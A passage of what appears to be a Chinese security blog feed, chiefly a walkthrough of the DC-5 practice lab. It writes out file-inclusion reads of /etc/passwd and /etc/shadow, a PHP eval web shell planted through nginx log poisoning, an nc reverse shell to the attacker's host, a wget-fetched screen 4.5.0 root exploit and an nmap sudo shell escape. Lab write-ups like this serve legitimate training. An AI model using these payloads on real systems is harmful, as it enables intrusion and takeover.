‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; $TF<br>sudo nmap –script&#x3D;$TF</p></blockquote><ul><li><p>重定向修改：本地hosts文件添加“IP域名”绑定项。</p></li><li><p>爆破真的是一项大工程，可能由于字典很大没法进行，所以爆破不出来可能只是字典的原因罢了</p></li><li><p>提权方法千千万，善于利用信息才好办，多找信息，多找方法，最终估计还得命令提权</p></li><li><p>后台系统找命令执行很重要，怎么拿到一个webshell确实很重要</p></li><li><p>可以通过别的用户权限的可执行文件去切换用户或者提权（我们最后就是通过jens用户提权成功的）</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-5</title>
    <link href="/2024/07/30/DC-5/"/>
    <url>/2024/07/30/DC-5/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-5"><a href="#DC-5" class="headerlink" title="DC-5"></a>DC-5</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>开关靶机，分别进行扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094648444.png" alt="image-20240717094648444"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717094804833.png" alt="image-20240717094804833"></p><p>确认得到目标靶机的IP地址：<code>192.168.204.134</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li>简便版扫描</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN -p- 192.168.204.134<br>nmap -sT -p- 192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717095154440.png" alt="image-20240717095154440"></p><p>可以知道，开放的服务端口一共有三个：<code>80</code>、<code>111</code>、<code>48004</code>，三个端口对应的开放服务为：<code>http</code>、<code>rpcbind</code>、<code>nimbusdb</code></p><blockquote><p>rpcbind是NFS中用来进行消息通知的服务。</p><p>NimbusDB 是一个云数据库解决方案，旨在提供高可用性和弹性，适用于各种应用程序。它通常支持多种数据模型，如文档、图形和关系型数据，并且常用于需要快速扩展和高性能的场景</p></blockquote><ul><li>详细版扫描</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,111,48004 192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100525580.png" alt="image-20240717100525580"></p><p>根据结果信息可以看到，目标靶机应该有一个网页界面。尝试在浏览器中访问目标靶机IP地址<code>192.168.204.134</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717100650334.png" alt="image-20240717100650334"></p><p>可以看到，确实有welcome信息。在进行网页各个项目浏览的时候，好像也没发现什么有用的特别的信息。为了进一步确认是否还有其它有用的信息。使用指纹工具识别该网页的技术构成。</p><ul><li>指纹识别</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101310142.png" alt="image-20240717101310142"></p><p>好，除了得知<code>Nginx的版本为 1.6.2</code>，其他的确认没啥有用的信息了。</p><h2 id="nmap漏扫"><a href="#nmap漏扫" class="headerlink" title="nmap漏扫"></a>nmap漏扫</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -script=vuln -p 80,111,48004 192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717101803699.png" alt="image-20240717101803699"></p><p>根据漏扫信息，可以知道，目标靶机可能存在一个CSRF漏洞：</p><blockquote><p><a href="http://192.168.204.134/contact.php">http://192.168.204.134:80/contact.php</a></p></blockquote><blockquote><p>CSRF漏洞是因为web应用程序在用户进行敏感操作时，如修改账号密码、添加账号、转账等，没有校验表单token或者http请求头中的referer值，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p></blockquote><p>言外之意就是，需要攻击方和用户操作方二者都进行操作，才可以完成的攻击行为。</p><p>靶场的攻打自然没有跟我们“互动”的用户。所以CSRF漏洞利用的思路可以暂时搁置了。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>截至目前为止，好像都没啥有用的信息，那就尝试进行目录爆破吧~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.134 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>爆破得到的结果如下：</p><blockquote><p><a href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p><p><a href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717102851778.png" alt="image-20240717102851778"></p><p>尝试访问爆破得到的两个链接，结果都显示为：<code>403 Forbidden</code></p><blockquote><p>403 Forbidden是网站访问过程中，常见的错误提示。资源不可用，服务器理解客户的请求，但拒绝处理它。这通常是由于服务器上文件或目录的权限设置导致，简单的理解为没有权限访问此站。</p></blockquote><p>所以，gobuster目录爆破也没得出什么有用的信息！！！！这个时候不要气馁，切换思路，爆破结果会不会跟使用的爆破字典有关系，我们可以尝试切换爆破工具进行再次爆破。</p><p>使用<code>dirsearch</code>试一下吧！</p><h2 id="dirsearch目录爆破"><a href="#dirsearch目录爆破" class="headerlink" title="dirsearch目录爆破"></a>dirsearch目录爆破</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dirsearch -u http://192.168.204.134<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717103657468.png" alt="image-20240717103657468"></p><p>咦！kali默认没有<code>dirsearch</code>，所以要先进行安装。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get update<br>apt-get install dirsearch<br></code></pre></td></tr></table></figure><p>ok！安装完成后，进行dirsearch目录爆破</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717104750906.png" alt="image-20240717104750906"></p><blockquote><p>&#x2F;contact.php</p><p><a href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p><p>&#x2F;faq.php</p><p>&#x2F;footer.php</p><p><a href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p><p>&#x2F;images&#x2F;</p><p>&#x2F;thankyou.php</p><p>这些都是目标靶机IP下的目录文件。</p></blockquote><h2 id="网页目录访问"><a href="#网页目录访问" class="headerlink" title="网页目录访问"></a>网页目录访问</h2><p>对上述爆破得到的目录在浏览器中逐一访问：</p><blockquote><p><a href="http://192.168.204.134/contact.php">http://192.168.204.134/contact.php</a></p><p><a href="http://192.168.204.134/css/">http://192.168.204.134/css/</a></p><p><a href="http://192.168.204.134/faq.php">http://192.168.204.134/faq.php</a></p><p><a href="http://192.168.204.134/footer.php">http://192.168.204.134/footer.php</a></p><p><a href="http://192.168.204.134/images/">http://192.168.204.134/images/</a></p><p><a href="http://192.168.204.134/thankyou.php">http://192.168.204.134/thankyou.php</a></p></blockquote><p>其中的<a href="http://192.168.204.134/css/%E5%92%8Chttp://192.168.204.134/images/%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E8%A2%AB%E8%AF%81%E6%98%8E%E6%B2%A1%E6%9C%89%E6%9D%83%E9%99%90%E8%AE%BF%E9%97%AE%E3%80%82">http://192.168.204.134/css/和http://192.168.204.134/images/之前已经被证明没有权限访问。</a></p><p>然后，<a href="http://192.168.204.134/contact.php%E5%92%8Chttp://192.168.204.134/faq.php%E5%88%86%E5%88%AB%E5%AF%B9%E5%BA%94%E7%9D%80%E7%BD%91%E9%A1%B5%E9%A6%96%E9%A1%B5%E4%B8%AD%E7%9A%84%60Contact%60%E5%92%8C%60FAQ%60%E6%A8%A1%E5%9D%97%E3%80%82%E4%B9%8B%E5%89%8D%E5%B7%B2%E7%BB%8F%E7%9C%8B%E8%BF%87%E4%BA%86%EF%BC%8C%E5%85%B6%E4%B8%AD%E6%B2%A1%E6%9C%89%E4%BB%80%E4%B9%88%E6%9C%89%E7%94%A8%E7%9A%84%E4%BF%A1%E6%81%AF%E3%80%82">http://192.168.204.134/contact.php和http://192.168.204.134/faq.php分别对应着网页首页中的`Contact`和`FAQ`模块。之前已经看过了，其中没有什么有用的信息。</a></p><p>访问<a href="http://192.168.204.134/footer.php%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://192.168.204.134/footer.php，得到：</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105942484.png" alt="image-20240717105942484"></p><p>最后的<a href="http://192.168.204.134/thankyou.php%EF%BC%8C%E5%BE%97%E5%88%B0%EF%BC%9A">http://192.168.204.134/thankyou.php，得到：</a></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717105954567.png" alt="image-20240717105954567"></p><p>经过简单的对比可以发现，footer.php文件的内容与thankyou.php文件内容下的页脚内容一致，因此，可以大致猜测两个文件之间存在着<code>文件包含</code>关系。</p><p>从<code>文件包含</code>入手。</p><h2 id="文件包含漏洞利用"><a href="#文件包含漏洞利用" class="headerlink" title="文件包含漏洞利用"></a>文件包含漏洞利用</h2><p><a href="https://www.freebuf.com/articles/web/369924.html">Web漏洞之文件包含漏洞</a></p><blockquote><p>首先先来明确一下，文件包含漏洞利用，利用的是什么？怎么利用的？想要实现的效果又是什么？</p><p>答：</p><p>问题一，利用的自然是“文件包含漏洞”，由于对方通过php函数引入文件时，没有对传入的文件名进行合理的校验，从而导致操作了预想之外的文件。</p><p>问题二，文件包含的利用方法是，在搜索地址栏（或其它注入点）处，对于包含了其它文件的url，后面添加<code>？file=文件路径（精确到文件名）</code></p><p>问题三，利用文件包含漏洞，我们本着getshell的目的，当然是想要获取一些重要的文件信息。在linux系统下，在我们还未取得登陆账户的情况下，一般都是想查找密码或用户名文件：<code>/etc/passwd</code>（账户）、<code>/etc/shadow</code>（密码）</p></blockquote><p>综上，我们执行如下文件包含url:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.134/thankyou.php?file=/etc/passwd<br>http://192.168.204.134/thankyou.php?file=/etc/shadow<br></code></pre></td></tr></table></figure><p>在浏览器搜索框执行，得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717142406079.png" alt="image-20240717142406079"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717174452209.png" alt="image-20240717174452209"></p><p><code>/etc/passwd</code>账户文件内容被成功返回并显示在浏览器页面中。这表明靶机网站确实存在文件包含漏洞。但是<code>/etc/shadow</code>密码文件并没有被成功显示在界面上，可以猜测是权限不足的问题。</p><h2 id="Get-shell"><a href="#Get-shell" class="headerlink" title="Get shell"></a>Get shell</h2><p><a href="https://www.freebuf.com/vuls/304690.html">红蓝对抗之服务攻防：Nginx中间件渗透总结</a></p><h3 id="先验知识"><a href="#先验知识" class="headerlink" title="先验知识"></a>先验知识</h3><blockquote><p>由上述端口扫描以及指纹识别可以得知，目标靶机网站使用的web服务器和反向代理是nginx（1.6.1版本）</p><p>nginx会将执行的命令记录下来并写入日志文件中，所以先读取一下nignx的配置信息，查看日志文件的位置</p></blockquote><h3 id="nginx日志文件读取"><a href="#nginx日志文件读取" class="headerlink" title="nginx日志文件读取"></a>nginx日志文件读取</h3><p><strong>总思路：利用<code>文件包含漏洞</code>，通过<code>burpsuite</code>抓取数据包获取nginx的不同日志文件。</strong></p><p><a href="https://blog.csdn.net/weixin_43945983/article/details/138070113">linux 查看nginx日志</a></p><blockquote><p>配置文件路径： &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>错误日志路径：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>访问日志：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p>利用文件包含漏洞，进行”文件注入“：</p><p>?file&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</p><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</p><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p></blockquote><p>对这三个目标”注入文件“进行逐一测试：</p><ul><li><strong>?file&#x3D;&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170624251.png" alt="image-20240717170624251"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717170642477.png" alt="image-20240717170642477"></p><p>”注入“成功，对该数据包进行重放，看其响应内容。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171025161.png" alt="image-20240717171025161"></p><p>响应html内容中，在其中的发现了<code>访问日志和错误日志的文件路径</code>。</p><ul><li><strong>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log</strong></li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717171427205.png" alt="image-20240717171427205"></p><p>同样进行数据包重放，在其响应内容中查找有用的信息。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200924814.png" alt="image-20240717200924814"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717200941862.png" alt="image-20240717200941862"></p><p>在错误日志中，我们可以发现，先前访问密码文件<code>/etc/shadow</code>引发的错误信息日志。可以看到，浏览器尝试打开文件<code>/etc/shadow</code>，但可能由于权限限制，文件打开失败。因此将该文件路径记录进错误日志中，记录服务器尝试打开文件但失败的信息。</p><blockquote><p>这里提供给我们一个思路：在将包含文件路径替换为一句话木马，目标服务器是否也会尝试去打开（执行）。</p></blockquote><p>至此，第三个访问配置文件就可以先不访问了。编写提权一句话木马，注入到文件包含路径处。</p><h3 id="注入一句话木马"><a href="#注入一句话木马" class="headerlink" title="注入一句话木马"></a>注入一句话木马</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash《》">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717194058442.png"></p><p>注意：需要将格式什么的一并写入的包含的路径处。</p><p>对错误日志文件进行文件包含并再次进行抓包-重放-查看，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717201101644.png" alt="image-20240717201101644"></p><p>可以发现，写入的一句话木马已经被成功记录在错误日志当中了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240717193905317.png" alt="image-20240717193905317"></p><p>但是此时尝试连接的时候怎么都连接不上！！！！尝试了挺多方法的。最后通过请教糖糖，得出了结论：<code>是由于没有给注入的一句话木马加上双引号导致的写入失败</code>。</p><blockquote><p>之前在修改用户hash密码的部分也强调了需要给密码值添加双引号！，原因是让后台程序将其当作一个字符串处理而不是对其进行编码。我猜测这次的一句话木马注入同理，如果不给其添加双引号告诉后台将其当作一整个字符串处理的话，那么后台就会对其进行从左到右的识别，即编码，这可能会导致“木马不成木马”。从而致使反弹shell失败。</p></blockquote><p>所以，对一句话木马<code>添加双引号</code>后进行重新注入：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718100954941.png" alt="image-20240718100954941"></p><p>访问错误日志，对其进行抓包并重放，查看响应日志：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718101452541.png" alt="image-20240718101452541"></p><p>可以发现，错误日志中已经写入了一句话木马。</p><p>接下来使用中国蚁剑新建连接，尝试让对方服务器执行我们注入的一句话木马，就是执行shell捏！。</p><p>新建连接，然后写入包含错误日志的url，密码是shell，测试连接！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113614750.png" alt="image-20240718113614750"></p><p>我测！还是提示”返回数据为空“！心理防线要崩溃了。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/33G0((%40QI847LS61RX4)RHY.png" alt="img"></p><p>仔细查看糖糖昨晚给我发的添加双引号后抓包得到的截图，发现我们在抓取的一句话木马注入的数据包上有些许不同。那就是，我注入的一句话木马在抓取到的数据包中，其<code>&lt;&gt;&quot;&quot;&#39;&#39;</code>都被编码了，而糖糖的并没有被编码（经过询问，可能是我使用的burpsuite版本有点低？）。</p><p>这不就是上面我所说的<code>被编码</code>问题了吗！我测！既然如此，你不仁便别怪我不义。</p><p>将抓取到的数据包发送到重放器，直接对数据包进行修改，把被编码的部分都改回来！！！然后重放该数据包，得到如下响应：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114303124.png" alt="image-20240718114303124"></p><p>这时候我们再对中国蚁剑进行连接测试。我测！连接成功了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718113449128.png" alt="image-20240718113449128"></p><p>尝试打开虚拟终端，我测！终于成功了！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114818442.png" alt="image-20240718114818442"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718114845899.png" alt="image-20240718114845899"></p><p>码垛，好激动！！！！！！！啊啊啊啊！！！血的记忆！！！！！</p><p>接下来就是要启动交互界面了，因为在虚拟终端中不能复制粘贴，啥命令都得自己打。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718161048835.png" alt="image-20240718161048835"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>上面已经成功地注入一句话木马并让对方服务器执行了shell了。现在我们需要在自己的本地终端”远程登陆“对方的用户账户，然后执行更进一步的操作。</p><p>结合之前的经验，我们可以通过注入脚本代码，让对方执行，并在我们本地终端监听端口，等待反弹shell。</p><p>同样是利用文件包含漏洞来实现这个脚本注入：</p><p>我们前面已经将一句话木马<code>&lt;?php @eval($_POST[&#39;shell&#39;]);?&gt;</code>写入了错误日志文件中。</p><p>现在我们想让对方不单执行<code>shell</code>，还要赋予我们权限（攻击方）为我们开启端口监听服务。因此我们可以将注入内部的<code>shell</code>使用<code>&amp;</code>符号进行重新更新。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/sh 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p><code>nc</code>使用nc（netcat）工具建立一个反弹shell连接</p><p><code>-e /bin/sh</code>指定连接建立后执行的程序，<code>/bin/sh</code>是指向系统默认的shell程序，用于执行命令行指令和脚本。</p><p>后面两个分别指明了攻击者的IP地址，以及攻击者设定的监听端口。</p><p>在网页连接中访问如下链接：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.204.134/thankyou.php?file=/var/log/nginx/error.log&amp;shell=nc -e /bin/sh 192.168.204.128 9999<br></code></pre></td></tr></table></figure><p>然后在中国蚁剑测试链接并打开虚拟终端。</p><p>为了防止错过端口监听，可以现在本地终端开启监听！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 9999<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718162910445.png" alt="image-20240718162910445"></p><p>在网页访问包含错误日志的新的链接，然后在中国蚁剑尝试连接，成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163019550.png" alt="image-20240718163019550"></p><p>双击点进去，看到其文件目录，发现我们已经能够访问之前没有权限访问的CSS目录了，里面是一个”system.css“文件，可以查看具体代码：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163405746.png" alt="image-20240718163405746"></p><p>打开虚拟终端，在其中输入我们重定义的<code>shell值</code>：<code>nc -e /bin/sh 192.168.204.128 9999</code>，回车：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163540220.png" alt="image-20240718163540220"></p><p>查看本地终端，发现已经连上了目标靶机：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718163732517.png" alt="image-20240718163732517"></p><p>启动交互界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718164219986.png" alt="image-20240718164219986"></p><p>接下来就是要查找其具有SUID权限的命令，尝试进行提权。当然也可以先查找一下当前用户账户下是否存在flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p>但是我们发现重要文件被拒绝访问了捏！所以我们得先提权！！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718175801209.png" alt="image-20240718175801209"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ul><li><strong>查看具有SUID权限的命令</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>得到如下结果：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184000866.png" alt="image-20240718184000866"></p><p>可用于提权的命令有：<code>mount</code>、<code>screen-4.5.0</code>、<code>exim4</code></p><p>根据之前的经验，可以有效进行提权的指令为<code>exim4</code>，但是相对复杂，需要逐个进行测试，唉，也不算咋复杂吧，有脚本的话会方便一点。</p><p>先从比较熟悉的命令开始尝试提权吧。</p><h3 id="mount提权"><a href="#mount提权" class="headerlink" title="mount提权"></a><strong>mount提权</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mount --o <span class="hljs-built_in">bind</span> /bin/bash /usr/bin/mount<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718184943024.png" alt="image-20240718184943024"></p><p>提示只有root权限用户才可以使用这个命令。</p><h3 id="exim4提权"><a href="#exim4提权" class="headerlink" title="exim4提权"></a><strong>exim4提权</strong></h3><p>查看使用版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185200089.png" alt="image-20240718185200089" style="zoom:150%;" /><p>版本为：<code> 4.84_2</code></p><p>使用<code>searchsploit</code>查找该exim4版本的可利用代码文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185651405.png" alt="image-20240718185651405"></p><p>只找到了一个4.84版本的漏洞利用文件，但是它是<code>4.84-3</code>，靶机使用的是<code>4.84_2</code>的。所以相当于，没有对于4.84_2版本的exim4漏洞利用文件。</p><p>使用exim4提权行不通咯！</p><h3 id="screen-4-5-0提权"><a href="#screen-4-5-0提权" class="headerlink" title="screen-4.5.0提权"></a><strong>screen-4.5.0提权</strong></h3><p><a href="https://beret81.gitbook.io/pte/quan-xian-ti-sheng/linux-ti-quan/suid-ti-quan/suid-ti-quan-screen4.5.0">SUID 提权– screen-4.5.0</a></p><p>同样也是先查找是否有关于其的漏洞利用文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit screen 4.5.0<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718185941675.png" alt="image-20240718185941675"></p><p>发现了一个脚本文件和一个txt文本文件。</p><blockquote><p>linux&#x2F;local&#x2F;41154.sh</p><p>linux&#x2F;local&#x2F;41152.txt</p></blockquote><p>首选，当然是利用脚本文件！</p><p><strong>先下载该脚本文件到当前目录下：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 41154.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718190652559.png" alt="image-20240718190652559"></p><p>然后，在本地终端（kali）启动apache2服务，将该脚本文件移动到<code>/var/www/html</code>文件夹下，相当于将文件放到网页上嘛。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">mv</span> 41154.sh /var/www/html<br>service apache2 status<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191251542.png" alt="image-20240718191251542"></p><p>然后，在目标靶机终端，进入<code>/tmp</code>目录下，使用<code>wget</code>命令下载该脚本文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/41154.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191456356.png" alt="image-20240718191456356"></p><p>然后给与该脚本文件执行的权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 41154.sh<br>./41154.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191748797.png" alt="image-20240718191748797"></p><p>ok！成功提权！</p><p>接下来就是查找flag文件了！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191857286.png" alt="image-20240718191857286"></p><p>cat该txt文件！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240718191931227.png" alt="image-20240718191931227"></p><p>大功告成。结束。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>攻打这个靶场运用到了<code>文件包含漏洞</code>的利用知识。还有中国蚁剑对于<code>反弹shell</code>的操作手法。</p><ul><li><p>文件包含漏洞：包含手法、测试方法、利用方法（在包含处注入一句话木马等）注意！非路径的注入都必须使用双引号收敛。否则有很大的可能会包含失败。</p></li><li><p>利用到了nginx的特点：nginx会将执行的命令记录下来并写入日志文件中。本文中使用中国蚁剑对nginx的错误日志进行连接的时候，会触发其执行包含注入的php代码（譬如一句话木马等）</p></li><li><p>目录爆破跟字典有关系，有些时候没爆破出东西，可能是字典不够大，换个工具或者换个字典都行。</p></li><li><p>新学到一个screen提权。</p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-4</title>
    <link href="/2024/07/24/DC-4/"/>
    <url>/2024/07/24/DC-4/</url>
    
